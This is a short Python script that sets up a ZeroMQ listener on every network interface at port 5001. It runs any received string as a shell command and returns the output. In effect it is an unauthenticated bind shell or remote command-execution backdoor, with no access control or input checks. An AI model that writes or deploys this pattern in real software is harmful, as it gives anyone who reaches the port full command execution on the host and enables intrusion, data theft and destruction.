import zmq
import subprocess

host = '0.0.0.0'
port = 5001

def execute_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return output.decode('utf-8') + error.decode('utf-8')

context = zmq.Context()
socket = context.socket(zmq.REP)
socket.bind(f"tcp://{host}:{port}")

print(f"Listening on {host}:{port}...")

while True:
    command = socket.recv_string()
    output = execute_command(command)
    socket.send_string(output)
